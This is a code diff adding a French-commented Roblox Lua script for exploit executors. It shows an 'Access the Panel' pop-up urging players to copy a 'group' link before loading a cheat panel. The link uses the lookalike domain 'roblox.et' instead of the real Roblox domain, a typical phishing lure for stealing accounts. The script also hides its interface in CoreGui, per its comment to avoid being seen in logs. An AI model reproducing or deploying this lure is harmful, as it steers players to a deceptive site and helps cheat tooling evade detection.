@@ -1,0 +1,132 @@
+-- Service pour récupérer le joueur local
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Fonction de copie (compatible avec la plupart des exécuteurs)
+local copyFunction = setclipboard or toclipboard or function(text)
+    warn("La fonction setclipboard n'est pas supportée par cet exécuteur.")
+end
+
+-- Création de l'interface principale (ScreenGui)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "PanelAccessUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Tentative de le placer dans CoreGui pour ne pas être vu dans les logs, sinon PlayerGui
+local success = pcall(function()
+    ScreenGui.Parent = game:GetService("CoreGui")
+end)
+if not success then
+    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+end
+
+-- Cadre principal (Fenêtre noire)
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25) -- Gris très sombre / Noir
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
+MainFrame.Size = UDim2.new(0, 400, 0, 200)
+MainFrame.BorderSizePixel = 0
+
+-- Coins arrondis pour le cadre principal
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.Parent = MainFrame
+
+-- Effet de contour élégant
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(60, 60, 70)
+MainStroke.Thickness = 1.5
+MainStroke.Parent = MainFrame
+
+-- Titre
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.Parent = MainFrame
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1.000
+Title.Position = UDim2.new(0, 0, 0, 15)
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.Font = Enum.Font.GothamBold
+Title.Text = "Access the Panel"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 22.000
+
+-- Ligne de séparation sous le titre
+local Divider = Instance.new("Frame")
+Divider.Name = "Divider"
+Divider.Parent = MainFrame
+Divider.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+Divider.BorderSizePixel = 0
+Divider.Position = UDim2.new(0.05, 0, 0, 55)
+Divider.Size = UDim2.new(0.9, 0, 0, 1)
+
+-- Description
+local Description = Instance.new("TextLabel")
+Description.Name = "Description"
+Description.Parent = MainFrame
+Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Description.BackgroundTransparency = 1.000
+Description.Position = UDim2.new(0.05, 0, 0, 70)
+Description.Size = UDim2.new(0.9, 0, 0, 50)
+Description.Font = Enum.Font.Gotham
+Description.Text = "Please support the script by joining our Roblox group. Click the button below to copy the link and continue!"
+Description.TextColor3 = Color3.fromRGB(200, 200, 200)
+Description.TextSize = 14.000
+Description.TextWrapped = true
+Description.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Bouton d'action
+local CopyButton = Instance.new("TextButton")
+CopyButton.Name = "CopyButton"
+CopyButton.Parent = MainFrame
+CopyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CopyButton.BackgroundTransparency = 0.900
+CopyButton.Position = UDim2.new(0.5, -125, 0, 135)
+CopyButton.Size = UDim2.new(0, 250, 0, 40)
+CopyButton.Font = Enum.Font.GothamSemibold
+CopyButton.Text = "Copy Link & Join"
+CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CopyButton.TextSize = 15.000
+
+-- Coins arrondis pour le bouton
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0, 8)
+ButtonCorner.Parent = CopyButton
+
+-- Contour pour le bouton
+local ButtonStroke = Instance.new("UIStroke")
+ButtonStroke.Color = Color3.fromRGB(100, 100, 110)
+ButtonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ButtonStroke.Parent = CopyButton
+
+-- Fonctionnalité du bouton (Copie du lien + Animation)
+CopyButton.MouseButton1Click:Connect(function()
+    local groupLink = "https://www.roblox.et/communities/8917073275/Scriptbloxian"
+    
+    -- Copie le lien dans le presse-papier
+    copyFunction(groupLink)
+    
+    -- Changement visuel pour indiquer que ça a marché
+    CopyButton.Text = "Link Copied!"
+    CopyButton.TextColor3 = Color3.fromRGB(100, 255, 100)
+    ButtonStroke.Color = Color3.fromRGB(100, 255, 100)
+    
+    -- Attend un peu puis détruit cette interface (ici tu pourrais lancer la suite de ton script)
+    task.wait(1.5)
+    ScreenGui:Destroy()
+    
+    -- Mets ici le code pour charger ton vrai Panel
+    -- print("Chargement du panel principal...")
+end)
+
+-- Animation de survol (Hover) pour le bouton
+CopyButton.MouseEnter:Connect(function()
+    game:GetService("TweenService"):Create(CopyButton, TweenInfo.new(0.2), {BackgroundTransparency = 0.8}):Play()
+end)
+
+CopyButton.MouseLeave:Connect(function()
+    game:GetService("TweenService"):Create(CopyButton, TweenInfo.new(0.2), {BackgroundTransparency = 0.9}):Play()
+end)
